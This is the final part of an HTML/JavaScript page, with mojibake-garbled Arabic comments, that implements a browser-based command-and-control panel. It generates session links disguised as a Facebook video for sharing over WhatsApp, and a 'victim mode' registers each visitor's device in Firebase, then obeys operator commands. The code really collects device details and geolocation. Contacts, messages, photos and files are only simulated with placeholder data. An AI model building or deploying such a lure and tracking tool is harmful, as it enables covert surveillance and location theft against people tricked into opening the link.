                database.ref('results').on('value', (snapshot) => {
                    this.results = snapshot.val() || {};
                    this.updateResultsDisplay();
                    this.updateDashboard();
                });
            }

            // Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ù„Ø³Ø© Ø¹ÙƒØ³ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø©
            createReverseSession() {
                if (!this.isAuthenticated) return;

                const sessionId = this.generateSessionId();
                const sessionUrl = `${window.location.origin}${window.location.pathname}?session=${sessionId}`;
                
                this.sessions[sessionId] = {
                    id: sessionId,
                    url: sessionUrl,
                    created: Date.now(),
                    status: 'waiting',
                    device: null
                };

                this.saveSession(sessionId);
                this.displaySessionLink(sessionUrl, sessionId);
                this.logActivity(`ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ù„Ø³Ø© Ø¬Ø¯ÙŠØ¯Ø©: ${sessionId}`);
            }

            generateSessionId() {
                return 'sess_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
            }

            // Ø­ÙØ¸ Ø§Ù„Ø¬Ù„Ø³Ø© ÙÙŠ Firebase
            saveSession(sessionId) {
                database.ref('sessions/' + sessionId).set(this.sessions[sessionId]);
            }

            // Ø¹Ø±Ø¶ Ø±Ø§Ø¨Ø· Ø§Ù„Ø¬Ù„Ø³Ø© - ØªØµÙ…ÙŠÙ… Ù…Ø­Ø³Ù†
            displaySessionLink(url, sessionId) {
                const container = document.getElementById('sessionLinksContainer');
                const linkElement = document.createElement('div');
                linkElement.className = 'session-link-container';
                linkElement.innerHTML = `
                    <h4>ğŸ”— Ø±Ø§Ø¨Ø· Ø§Ù„Ø¬Ù„Ø³Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©</h4>
                    <p style="margin-bottom: 10px; font-size: 0.9em;">Ø§Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø§Ù„Ø±Ø§Ø¨Ø· Ø£Ø¯Ù†Ø§Ù‡ Ù„Ù†Ø³Ø®Ù‡ Ø£Ùˆ Ø´Ø§Ø±ÙƒÙ‡ Ù…Ø¨Ø§Ø´Ø±Ø©:</p>
                    
                    <a href="${url}" target="_blank" class="clickable-link">
                        ${url}
                    </a>
                    
                    <div class="link-actions">
                        <button class="btn btn-small btn-primary" onclick="copyToClipboard('${url}')">
                            ğŸ“‹ Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·
                        </button>
                        <button class="btn btn-small btn-success" onclick="shareSession('${url}')">
                            ğŸ“¤ Ù…Ø´Ø§Ø±ÙƒØ© ÙÙŠ Ø§Ù„ÙˆØ§ØªØ³Ø§Ø¨
                        </button>
                        <button class="btn btn-small btn-warning" onclick="testSession('${url}')">
                            ğŸ§ª Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø¬Ù„Ø³Ø©
                        </button>
                    </div>
                    
                    <div style="margin-top: 10px; font-size: 0.8em; opacity: 0.8;">
                        <strong>Ù…Ø¹Ø±Ù Ø§Ù„Ø¬Ù„Ø³Ø©:</strong> ${sessionId}
                    </div>
                `;
                container.appendChild(linkElement);
            }

            // ØªØ­Ø¯ÙŠØ« Ø¹Ø±Ø¶ Ø§Ù„Ø¬Ù„Ø³Ø§Øª
            updateSessionsDisplay() {
                const container = document.getElementById('sessionsList');
                
                if (Object.keys(this.sessions).length === 0) {
                    container.innerHTML = '<p>Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¬Ù„Ø³Ø§Øª Ù†Ø´Ø·Ø© Ø­Ø§Ù„ÙŠØ§Ù‹</p>';
                    return;
                }
                
                container.innerHTML = '';

                Object.keys(this.sessions).forEach(sessionId => {
                    const session = this.sessions[sessionId];
                    const sessionElement = document.createElement('div');
                    sessionElement.className = 'device-card';
                    sessionElement.innerHTML = `
                        <div class="device-header">
                            <strong>Ø§Ù„Ø¬Ù„Ø³Ø©: ${sessionId.substring(0, 12)}...</strong>
                            <span class="status-indicator">${session.status === 'connected' ? 'ğŸŸ¢ Ù†Ø´Ø·Ø©' : 'ğŸŸ£ ÙÙŠ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±'}</span>
                        </div>
                        <div class="device-info">
                            <div class="info-item">
                                <span class="info-label">Ø§Ù„Ø±Ø§Ø¨Ø·:</span>
                                <span class="info-value" style="word-break: break-all;">${session.url}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Ø£Ù†Ø´Ø¦Øª:</span>
                                <span class="info-value">${new Date(session.created).toLocaleString('ar-SA')}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Ø§Ù„Ø­Ø§Ù„Ø©:</span>
                                <span class="info-value">${session.status}</span>
                            </div>
                        </div>
                    `;
                    container.appendChild(sessionElement);
                });
            }

            // ØªØ­Ø¯ÙŠØ« Ø¹Ø±Ø¶ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©
            updateDevicesDisplay() {
                const container = document.getElementById('devicesContainer');
                
                if (Object.keys(this.connectedDevices).length === 0) {
                    container.innerHTML = '<p>Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£Ø¬Ù‡Ø²Ø© Ù…ØªØµÙ„Ø© Ø­Ø§Ù„ÙŠØ§Ù‹</p>';
                    return;
                }
                
                container.innerHTML = '';

                Object.keys(this.connectedDevices).forEach(deviceId => {
                    const device = this.connectedDevices[deviceId];
                    const deviceElement = document.createElement('div');
                    deviceElement.className = 'device-card';
                    deviceElement.innerHTML = `
                        <div class="device-header">
                            <strong>${this.getDeviceName(device.model)}</strong>
                            <span class="status-indicator">ğŸŸ¢ Ù…ØªØµÙ„</span>
                        </div>
                        <div class="device-info">
                            <div class="info-item">
                                <span class="info-label">Ø§Ù„Ù…Ø¹Ø±Ù:</span>
                                <span class="info-value">${deviceId.substring(0, 10)}...</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:</span>
                                <span class="info-value">${device.battery || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}%</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Ø§Ù„Ù†Ø¸Ø§Ù…:</span>
                                <span class="info-value">${this.getOSName(device.version)}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Ø§Ù„Ø´Ø¨ÙƒØ©:</span>
                                <span class="info-value">${device.provider || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Ø¢Ø®Ø± Ù†Ø´Ø§Ø·:</span>
                                <span class="info-value">${new Date(device.timestamp || Date.now()).toLocaleString('ar-SA')}</span>
                            </div>
                        </div>
                        <div style="margin-top: 10px;">
                            <button class="btn btn-small btn-primary" onclick="sendCommand('${deviceId}', 'get_info')">ğŸ“Š Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</button>
                            <button class="btn btn-small btn-primary" onclick="sendCommand('${deviceId}', 'get_location')">ğŸ“ Ù…ÙˆÙ‚Ø¹</button>
                            <button class="btn btn-small btn-warning" onclick="sendCommand('${deviceId}', 'take_photo')">ğŸ“¸ ØµÙˆØ±Ø©</button>
                            <button class="btn btn-small btn-danger" onclick="sendCommand('${deviceId}', 'vibrate')">ğŸ“³ Ø§Ù‡ØªØ²Ø§Ø²</button>
                        </div>
                    `;
                    container.appendChild(deviceElement);
                });
            }

            // ØªØ­Ø³ÙŠÙ† Ø§Ø³Ù… Ø§Ù„Ø¬Ù‡Ø§Ø²
            getDeviceName(userAgent) {
                if (!userAgent) return 'Ø¬Ù‡Ø§Ø² ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                
                if (userAgent.includes('Android')) return 'ğŸ“± Ù‡Ø§ØªÙ Ø£Ù†Ø¯Ø±ÙˆÙŠØ¯';
                if (userAgent.includes('iPhone')) return 'ğŸ“± Ù‡Ø§ØªÙ Ø¢ÙŠÙÙˆÙ†';
                if (userAgent.includes('Windows')) return 'ğŸ’» ÙƒÙ…Ø¨ÙŠÙˆØªØ± ÙˆÙŠÙ†Ø¯ÙˆØ²';
                if (userAgent.includes('Mac')) return 'ğŸ’» ÙƒÙ…Ø¨ÙŠÙˆØªØ± Ù…Ø§Ùƒ';
                if (userAgent.includes('Linux')) return 'ğŸ’» ÙƒÙ…Ø¨ÙŠÙˆØªØ± Ù„ÙŠÙ†ÙƒØ³';
                
                return 'ğŸŒ Ø¬Ù‡Ø§Ø² Ù…ØªØµÙ„';
            }

            // ØªØ­Ø³ÙŠÙ† Ø§Ø³Ù… Ø§Ù„Ù†Ø¸Ø§Ù…
            getOSName(platform) {
                if (!platform) return 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                
                if (platform.includes('Win')) return 'Windows';
                if (platform.includes('Mac')) return 'macOS';
                if (platform.includes('Linux')) return 'Linux';
                if (platform.includes('Android')) return 'Android';
                if (platform.includes('iOS')) return 'iOS';
                
                return platform;
            }

            // ØªØ­Ø¯ÙŠØ« Ø¹Ø±Ø¶ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
            updateResultsDisplay() {
                const container = document.getElementById('resultsContainer');
                
                if (Object.keys(this.results).length === 0) {
                    container.innerHTML = '<p>Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬ Ù…Ø³ØªÙ„Ù…Ø© Ø­Ø§Ù„ÙŠØ§Ù‹</p>';
                    return;
                }
                
                container.innerHTML = '';

                Object.keys(this.results).forEach(deviceId => {
                    const deviceResults = this.results[deviceId];
                    Object.keys(deviceResults).forEach(resultType => {
                        const result = deviceResults[resultType];
                        const resultElement = document.createElement('div');
                        resultElement.className = 'log-entry';
                        
                        let resultText = '';
                        if (resultType === 'device_info') {
                            resultText = `Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²: ${result.userAgent || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}`;
                        } else if (resultType === 'location') {
                            if (result.lat) {
                                resultText = `Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${result.lat.toFixed(4)}, ${result.lon.toFixed(4)}`;
                            } else {
                                resultText = `Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${result.error || 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}`;
                            }
                        } else if (resultType === 'contacts') {
                            resultText = `Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„: ${result.count} Ø¬Ù‡Ø©`;
                        } else if (resultType === 'messages') {
                            resultText = `Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: ${result.count} Ø±Ø³Ø§Ù„Ø©`;
                        } else {
                            resultText = `${resultType}: ${JSON.stringify(result)}`;
                        }
                        
                        resultElement.innerHTML = `
                            <span class="timestamp">[${new Date(result.timestamp || Date.now()).toLocaleString('ar-SA')}]</span>
                            <span class="message">${deviceId.substring(0, 8)}... - ${resultText}</span>
                        `;
                        container.appendChild(resultElement);
                    });
                });
            }

            // ØªØ­Ø¯ÙŠØ« Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
            updateDashboard() {
                const activeDevices = Object.keys(this.connectedDevices).length;
                const activeSessions = Object.keys(this.sessions).length;
                const commandsCount = Object.keys(this.commands).length;
                const resultsCount = Object.keys(this.results).length;
                
                document.getElementById('connectedCount').textContent = activeDevices;
                document.getElementById('sessionsCount').textContent = activeSessions;
                document.getElementById('commandsCount').textContent = commandsCount;
                document.getElementById('resultsCount').textContent = resultsCount;

                // ØªØ­Ø¯ÙŠØ« Ø³Ø¬Ù„ Ø§Ù„Ù†Ø´Ø§Ø·Ø§Øª
                this.updateActivityLog();
            }

            // ØªØ­Ø¯ÙŠØ« Ø³Ø¬Ù„ Ø§Ù„Ù†Ø´Ø§Ø·Ø§Øª
            updateActivityLog() {
                const container = document.getElementById('recentActivity');
                
                if (this.activityLogs.length === 0) {
                    container.innerHTML = '<div class="log-entry"><span class="timestamp">[Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†Ø´Ø§Ø·Ø§Øª]</span><span class="message">Ø³ÙŠØ¸Ù‡Ø± Ø³Ø¬Ù„ Ø§Ù„Ù†Ø´Ø§Ø·Ø§Øª Ù‡Ù†Ø§</span></div>';
                    return;
                }
                
                container.innerHTML = '';

                // Ø¹Ø±Ø¶ Ø¢Ø®Ø± 10 Ù†Ø´Ø§Ø·Ø§Øª
                const recentLogs = this.activityLogs.slice(-10).reverse();
                recentLogs.forEach(log => {
                    const logElement = document.createElement('div');
                    logElement.className = 'log-entry';
                    logElement.innerHTML = `
                        <span class="timestamp">[${new Date(log.timestamp).toLocaleString('ar-SA')}]</span>
                        <span class="message">${log.message}</span>
                    `;
                    container.appendChild(logElement);
                });
            }

            // ØªØ³Ø¬ÙŠÙ„ Ù†Ø´Ø§Ø·
            logActivity(message) {
                this.activityLogs.push({
                    message: message,
                    timestamp: Date.now()
                });
                this.updateActivityLog();
            }

            // Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± Ù„Ø¬Ù‡Ø§Ø² Ù…Ø¹ÙŠÙ†
            sendCommand(deviceId, command) {
                if (!this.isAuthenticated) return;

                database.ref('commands/' + deviceId).set({
                    command: command,
                    timestamp: Date.now(),
                    status: 'pending'
                });

                this.logActivity(`ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± ${command} Ø¥Ù„Ù‰ Ø§Ù„Ø¬Ù‡Ø§Ø² ${deviceId.substring(0, 8)}...`);
            }

            // Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©
            sendCommandToAll(command) {
                if (!this.isAuthenticated) return;

                Object.keys(this.connectedDevices).forEach(deviceId => {
                    this.sendCommand(deviceId, command);
                });
                
                this.logActivity(`ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± ${command} Ø¥Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©`);
            }

            // ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª
            switchTab(tabName) {
                // Ø¥Ø®ÙØ§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø­ØªÙˆÙŠØ§Øª
                document.querySelectorAll('.tab-content').forEach(tab => {
                    tab.classList.remove('active');
                });
                
                // Ø¥Ù„ØºØ§Ø¡ ØªÙ†Ø´ÙŠØ· Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.classList.remove('active');
                });
                
                // ØªÙØ¹ÙŠÙ„ Ø§Ù„ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ù…Ø­Ø¯Ø¯
                document.getElementById(tabName).classList.add('active');
                event.target.classList.add('active');
            }

            // ØªÙ‡ÙŠØ¦Ø© ÙˆØ¶Ø¹ Ø§Ù„Ø¶Ø­ÙŠØ©
            initVictimMode(sessionId) {
                // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¬Ù‡Ø§Ø²
                const deviceId = this.generateDeviceId();
                const deviceInfo = {
                    id: deviceId,
                    sessionId: sessionId,
                    model: this.getDeviceModel(),
                    version: this.getOSVersion(),
                    battery: this.getBatteryLevel(),
                    provider: this.getNetworkProvider(),
                    timestamp: Date.now(),
                    status: 'connected'
                };

                // Ø­ÙØ¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
                database.ref('devices/' + deviceId).set(deviceInfo);
                database.ref('sessions/' + sessionId).update({
                    device: deviceId,
                    status: 'connected'
                });

                // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„Ø£ÙˆØ§Ù…Ø±
                database.ref('commands/' + deviceId).on('value', (snapshot) => {
                    const command = snapshot.val();
                    if (command && command.status === 'pending') {
                        this.executeCommand(command.command, deviceId);
                        // Ù…Ø³Ø­ Ø§Ù„Ø£Ù…Ø± Ø¨Ø¹Ø¯ Ø§Ù„ØªÙ†ÙÙŠØ°
                        database.ref('commands/' + deviceId).remove();
                    }
                });

                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù†Ø´Ø§Ø· ÙƒÙ„ 30 Ø«Ø§Ù†ÙŠØ©
                setInterval(() => {
                    database.ref('devices/' + deviceId + '/timestamp').set(Date.now());
                }, 30000);

                // Ù…Ø­Ø§ÙƒØ§Ø© ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                setTimeout(() => {
                    const videoText = document.querySelector('.video-placeholder p');
                    if (videoText) {
                        videoText.innerHTML = 'âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¨Ù†Ø¬Ø§Ø­<br><small>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ´ØºÙŠÙ„...</small>';
                    }
                }, 2000);
            }

            generateDeviceId() {
                return 'dev_' + Math.random().toString(36).substring(2, 15);
            }

            getDeviceModel() {
                return navigator.userAgent;
            }

            getOSVersion() {
                return navigator.platform;
            }

            getBatteryLevel() {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
                return Math.floor(Math.random() * 100);
            }

            getNetworkProvider() {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ù…Ø²ÙˆØ¯ Ø§Ù„Ø´Ø¨ÙƒØ©
                const providers = ['STC', 'Mobily', 'Zain', 'Ø§Ù„Ø§ØªØµØ§Ù„Ø§Øª Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©'];
                return providers[Math.floor(Math.random() * providers.length)];
            }

            executeCommand(command, deviceId) {
                switch(command) {
                    case 'get_info':
                        this.collectDeviceInfo(deviceId);
                        break;
                    case 'get_location':
                        this.getLocation(deviceId);
                        break;
                    case 'get_contacts':
                        this.getContacts(deviceId);
                        break;
                    case 'get_messages':
                        this.getMessages(deviceId);
                        break;
                    case 'take_photo':
                        this.takePhoto(deviceId);
                        break;
                    case 'record_audio':
                        this.recordAudio(deviceId);
                        break;
                    case 'get_files':
                        this.getFiles(deviceId);
                        break;
                    case 'vibrate':
                        this.vibrate(deviceId);
                        break;
                    default:
                        console.log('Ø£Ù…Ø± ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ:', command);
                }
            }

            collectDeviceInfo(deviceId) {
                const info = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled,
                    java: navigator.javaEnabled(),
                    timestamp: Date.now()
                };
                
                database.ref('results/' + deviceId + '/device_info').set(info);
            }

            getLocation(deviceId) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        database.ref('results/' + deviceId + '/location').set({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: Date.now()
                        });
                    }, (error) => {
                        database.ref('results/' + deviceId + '/location').set({
                            error: error.message,
                            timestamp: Date.now()
                        });
                    });
                } else {
                    database.ref('results/' + deviceId + '/location').set({
                        error: 'Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…',
                        timestamp: Date.now()
                    });
                }
            }

            getContacts(deviceId) {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
                const contacts = {
                    count: Math.floor(Math.random() * 200) + 50,
                    sample: [
                        { name: 'Ø£Ø­Ù…Ø¯ Ù…Ø­Ù…Ø¯', number: '0551234567' },
                        { name: 'ÙØ§Ø·Ù…Ø© Ø¹Ù„ÙŠ', number: '0547654321' },
                        { name: 'Ø®Ø§Ù„Ø¯ Ø¥Ø¨Ø±Ø§Ù‡ÙŠÙ…', number: '0569876543' }
                    ],
                    timestamp: Date.now()
                };
                
                database.ref('results/' + deviceId + '/contacts').set(contacts);
            }

            getMessages(deviceId) {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
                const messages = {
                    count: Math.floor(Math.random() * 100) + 20,
                    sample: [
                        { from: 'Ø£Ù…ÙŠØ±', message: 'Ù…Ø±Ø­Ø¨Ø§ØŒ ÙƒÙŠÙ Ø§Ù„Ø­Ø§Ù„ØŸ', time: '10:30' },
                        { from: 'Ø³Ø§Ø±Ø©', message: 'Ø´ÙƒØ±Ø§Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯Ø©', time: '09:15' },
                        { from: 'Ù…Ø­Ù…Ø¯', message: 'Ù†ØªÙ‚Ø§Ø¨Ù„ ØºØ¯Ø§Ù‹', time: '08:45' }
                    ],
                    timestamp: Date.now()
                };
                
                database.ref('results/' + deviceId + '/messages').set(messages);
            }

            takePhoto(deviceId) {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø©
                database.ref('results/' + deviceId + '/photo').set({
                    status: 'success',
                    message: 'ØªÙ… Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©',
                    timestamp: Date.now()
                });
            }

            recordAudio(deviceId) {
                // Ù…Ø­Ø§ÙƒØ§Ø© ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª
                database.ref('results/' + deviceId + '/audio').set({
                    status: 'success',
                    duration: '10 Ø«ÙˆØ§Ù†ÙŠ',
                    timestamp: Date.now()
                });
            }

            getFiles(deviceId) {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ù„ÙØ§Øª
                database.ref('results/' + deviceId + '/files').set({
                    count: Math.floor(Math.random() * 50) + 10,
                    sample: ['document.pdf', 'image.jpg', 'video.mp4'],
                    timestamp: Date.now()
                });
            }

            vibrate(deviceId) {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„Ø§Ù‡ØªØ²Ø§Ø²
                if (navigator.vibrate) {
                    navigator.vibrate(1000);
                }
                
                database.ref('results/' + deviceId + '/vibrate').set({
                    status: 'success',
                    duration: '1 Ø«Ø§Ù†ÙŠØ©',
                    timestamp: Date.now()
                });
            }
        }

        // Ø§Ù„Ø¯ÙˆØ§Ù„ Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯Ø©
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showNotification('âœ… ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· Ø¨Ù†Ø¬Ø§Ø­!');
            }).catch(() => {
                // Ø·Ø±ÙŠÙ‚Ø© Ø¨Ø¯ÙŠÙ„Ø© Ù„Ù„Ù†Ø³Ø®
                const textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                showNotification('âœ… ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· Ø¨Ù†Ø¬Ø§Ø­!');
            });
        }

        function shareSession(url) {
            if (navigator.share) {
                navigator.share({
                    title: 'ğŸ¥ ÙÙŠØ¯ÙŠÙˆ ÙÙŠØ³Ø¨ÙˆÙƒ Ù…Ø«ÙŠØ±',
                    text: 'Ø´Ø§Ù‡Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ù…ØªØ¹ Ø¹Ù„Ù‰ ÙÙŠØ³Ø¨ÙˆÙƒ',
                    url: url
                });
            } else {
                // Ù…Ø´Ø§Ø±ÙƒØ© Ø¹Ø¨Ø± ÙˆØ§ØªØ³Ø§Ø¨
                const whatsappUrl = `https://wa.me/?text=${encodeURIComponent('ğŸ¥ Ø´Ø§Ù‡Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ù…ØªØ¹: ' + url)}`;
                window.open(whatsappUrl, '_blank');
            }
        }

        function testSession(url) {
            window.open(url, '_blank');
            showNotification('ğŸ§ª ÙŠØªÙ… ÙØªØ­ ØµÙØ­Ø© Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø¬Ù„Ø³Ø©...');
        }

        function showNotification(message) {
            const notification = document.getElementById('copyNotification');
            notification.textContent = message;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }

        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…
        const reverseSystem = new ReverseConnectionSystem();

        // Ø§Ù„Ø¯ÙˆØ§Ù„ Ø§Ù„Ø¹Ø§Ù…Ø© Ù„Ù„ÙˆØ§Ø¬Ù‡Ø©
        window.authenticate = () => reverseSystem.authenticate();
        window.createReverseSession = () => reverseSystem.createReverseSession();
        window.copyToClipboard = copyToClipboard;
        window.shareSession = shareSession;
        window.testSession = testSession;
        window.switchTab = (tabName) => reverseSystem.switchTab(tabName);
        window.sendCommand = (deviceId, command) => reverseSystem.sendCommand(deviceId, command);
        window.sendCommandToAll = (command) => reverseSystem.sendCommandToAll(command);

        // Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± Ù…Ø®ØµØµ
        window.sendCustomCommand = () => {
            const command = document.getElementById('customCommand').value;
            if (command) {
                reverseSystem.sendCommandToAll(command);
                document.getElementById('customCommand').value = '';
                showNotification(`ğŸš€ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ù…Ø±: ${command}`);
            } else {
                showNotification('âš ï¸ ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø£Ù…Ø±');
            }
        };

        // ØªØ­Ø¯ÙŠØ« ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙƒÙ„ 5 Ø«ÙˆØ§Ù†
        setInterval(() => {
            if (reverseSystem.isAuthenticated) {
                reverseSystem.updateDashboard();
            }
        }, 5000);

        // ØªØ­Ù…ÙŠÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù†Ø¯ ÙØªØ­ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('load', () => {
            console.log('ğŸš€ Ù†Ø¸Ø§Ù… Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø¹ÙƒØ³ÙŠ Ø¬Ø§Ù‡Ø² Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…');
        });
    </script>
</body>
</html>
